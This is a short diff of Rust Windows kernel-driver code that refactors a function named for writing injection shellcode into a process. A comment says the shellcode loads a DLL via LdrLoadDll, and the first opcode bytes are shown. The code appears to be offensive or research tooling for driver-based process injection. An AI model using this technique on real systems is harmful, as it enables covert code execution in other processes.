@@ -1,6 +1,6 @@
-use core::{ffi::c_void, iter::once, ptr::null_mut, sync::atomic::Ordering};
+use core::{arch::asm, ffi::c_void, iter::once, ptr::null_mut, sync::atomic::Ordering};
 
-use alloc::vec::Vec;
+use alloc::{vec, vec::Vec};
 use anyhow::{Result, bail};
 use wdk::{nt_success, println};
 use wdk_sys::{
@@ -156,7 +156,7 @@ fn write_shellcode_in_process_for_injection() -> Result<*const c_void> {
     //
     // Shellcode to load a DLL into a process via LdrLoadDll
     //
-    let mut shellcode = [
+    let mut shellcode = vec![
         0x48u8, 0x83, 0xEC, 0x28, // sub rsp, 0x28
         0x48, 0x31, 0xD2, // xor rdx, rdx
         0x48, 0x31, 0xC9, // xor rcx, rcx
